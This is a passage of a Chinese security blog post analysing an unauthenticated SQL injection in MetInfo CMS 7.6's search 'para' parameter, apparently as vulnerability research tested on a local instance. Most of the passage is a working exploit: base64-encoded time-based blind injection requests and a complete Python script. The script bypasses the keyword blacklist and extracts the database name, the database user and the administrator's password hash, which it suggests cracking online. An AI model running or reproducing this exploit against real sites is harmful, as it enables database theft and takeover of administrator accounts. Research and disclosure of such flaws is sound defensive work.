+<p>ok，此处我们遵从路由规则即可。<code>GET /job/index.php?search=search&amp;para=&lt;base64(json)&gt;</code>。</p>
+<p>但是此处我们失败了，回头看代码是因为<code>job_database.class.php</code>重写了父类的<code>get_list_by_class_sql</code>，里面的para分支不见了！！！所以我们回头重新找一个没有重写的即可。全局搜<code>get_list_page</code>。找了一个<code>download</code>的。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/21.png" class="" title="Pasted image 20260826170552">
+
+<p>尝试时间盲注<code>&#123;&quot;1&#39; OR SLEEP(0.1)-- -&quot;:&quot;x&quot;&#125;</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /download/index.php?search=search&amp;para=eyIxJyBPUiBTTEVFUCgwLjEpLS0gLSI6IngifQ== HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8000</span><br><span class="line"></span><br><span class="line">GET /news/index.php?search=search&amp;para=eyIxJyBPUiBTTEVFUCgwLjEpLS0gLSI6IngifQ== HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8000</span><br></pre></td></tr></table></figure>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/22.png" class="" title="Pasted image 20260826170616">
+
+<p>成功了。实际上不止download路由存在漏洞。</p>
+<p>给出exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">MetInfo 7.6 前台搜索 para 参数 未授权 SQL 注入 — 时间盲注数据提取脚本</span></span><br><span class="line"><span class="string">注入点: parameter_label::get_search_list_sql()  info 位置 (met_plist, 2行)</span></span><br><span class="line"><span class="string">oracle : SLEEP(1) 执行 → ~2s ; 不执行 → ~0.06s</span></span><br><span class="line"><span class="string">用法   : python metinfo_blind_extract.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">BASE = <span class="string">&quot;http://127.0.0.1:8000/download/index.php?lang=cn&amp;search=search&amp;para=&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sqlinsert() 对 base64 串的关键词黑名单（大小写不敏感）</span></span><br><span class="line">BLOCKED = [<span class="string">&quot;select&quot;</span>, <span class="string">&quot;insert&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;delete&quot;</span>, <span class="string">&quot;union&quot;</span>, <span class="string">&quot;into&quot;</span>,</span><br><span class="line">           <span class="string">&quot;load_file&quot;</span>, <span class="string">&quot;outfile&quot;</span>, <span class="string">&quot;sleep&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;~&quot;</span>]</span><br><span class="line"></span><br><span class="line">SLEEP_SEC = <span class="number">0.5</span>   <span class="comment"># 单次 SLEEP 秒数（met_plist 2 行 → TRUE≈2×0.5=1s，FALSE≈0.06s）</span></span><br><span class="line">THRESHOLD = <span class="number">0.5</span>   <span class="comment"># 判定阈值，calibrate() 会自动校准</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">info, key=<span class="string">&quot;200&quot;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;构造 para=base64(json)，若 base64 命中黑名单则末尾补空格重试（补位在 -- 注释内，不影响 SQL）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = json.dumps(&#123;key: info&#125;, ensure_ascii=<span class="literal">False</span>, separators=(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;:&quot;</span>))</span><br><span class="line">        b = base64.b64encode(data.encode(<span class="string">&quot;utf-8&quot;</span>)).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        low = b.lower()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">any</span>(w <span class="keyword">in</span> low <span class="keyword">for</span> w <span class="keyword">in</span> BLOCKED):</span><br><span class="line">            <span class="keyword">return</span> b</span><br><span class="line">        info += <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">info</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;发送请求，返回耗时&quot;&quot;&quot;</span></span><br><span class="line">    url = BASE.<span class="built_in">format</span>(enc(info))</span><br><span class="line">    t0 = time.time()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        urllib.request.urlopen(url, timeout=<span class="number">15</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> time.time() - t0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">condition</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;条件为真 → SLEEP → 超过阈值；返回布尔&quot;&quot;&quot;</span></span><br><span class="line">    payload = <span class="string">&quot;x&#x27; OR IF(&#123;&#125;,SLEEP(&#123;&#125;),0)-- -&quot;</span>.<span class="built_in">format</span>(condition, SLEEP_SEC)</span><br><span class="line">    <span class="keyword">return</span> send(payload) &gt; THRESHOLD</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calibrate</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;校准阈值：测一次确定真假，取中间值&quot;&quot;&quot;</span></span><br><span class="line">    t_false = send(<span class="string">&quot;x&#x27; OR IF(1=2,SLEEP(&#123;&#125;),0)-- -&quot;</span>.<span class="built_in">format</span>(SLEEP_SEC))</span><br><span class="line">    t_true = send(<span class="string">&quot;x&#x27; OR IF(1=1,SLEEP(&#123;&#125;),0)-- -&quot;</span>.<span class="built_in">format</span>(SLEEP_SEC))</span><br><span class="line">    <span class="keyword">global</span> THRESHOLD</span><br><span class="line">    THRESHOLD = (t_false + t_true) / <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 校准: FALSE=%.2fs TRUE=%.2fs 阈值=%.2fs&quot;</span> % (t_false, t_true, THRESHOLD))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">query, length, desc=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;逐字符二分盲注提取, query 为不带 SELECT 的查询表达式或完整 SELECT&quot;&quot;&quot;</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        lo, hi = <span class="number">32</span>, <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">            mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">            cond = <span class="string">&quot;ASCII(SUBSTR((&#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(query, pos, mid)</span><br><span class="line">            <span class="keyword">if</span> oracle(cond):</span><br><span class="line">                lo = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                hi = mid</span><br><span class="line">        result += <span class="built_in">chr</span>(lo)</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;\r[%s] %s %d/%d -&gt; %s&quot;</span> % (desc, query[:<span class="number">40</span>], pos, length, result))</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] MetInfo 7.6 para 参数时间盲注提取&quot;</span>)</span><br><span class="line">    calibrate()</span><br><span class="line"></span><br><span class="line">    db = extract(<span class="string">&quot;SELECT DATABASE()&quot;</span>, <span class="number">20</span>, <span class="string">&quot;DB&quot;</span>)</span><br><span class="line">    user = extract(<span class="string">&quot;SELECT USER()&quot;</span>, <span class="number">20</span>, <span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[+] database =&quot;</span>, db)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] user     =&quot;</span>, user)</span><br><span class="line"></span><br><span class="line">    admin_id = extract(<span class="string">&quot;SELECT admin_id FROM met_admin_table LIMIT 1&quot;</span>, <span class="number">20</span>, <span class="string">&quot;admin_id&quot;</span>)</span><br><span class="line">    admin_pass = extract(<span class="string">&quot;SELECT admin_pass FROM met_admin_table LIMIT 1&quot;</span>, <span class="number">32</span>, <span class="string">&quot;admin_pass&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 提取结果:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;    admin_id  = %s&quot;</span> % admin_id)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;    admin_pass= %s&quot;</span> % admin_pass)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;    (admin_pass 为 MD5，可用 cmd5/somd5 反查明文)&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/23.png" class="" title="Pasted image 20260826173005">
+
+
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Meteor_Kai</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://blog.meteorkai.top/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">https://blog.meteorkai.top/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>CyberSecurity brings me great joy!</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CNVD%E5%88%86%E6%9E%90/"># CNVD分析</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span> | </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/">Java反序列化之SnakeYaml链</a>
+            
+        </section>
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Meteor_Kai | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">
+            访客数：<span id="busuanzi_value_site_uv"></span>
+        </span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_pv">
+            总访问量：<span id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+    <!-- 不蒜子计数器 -->
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</footer>
+
+    </div>
+</body>
+
+</html>
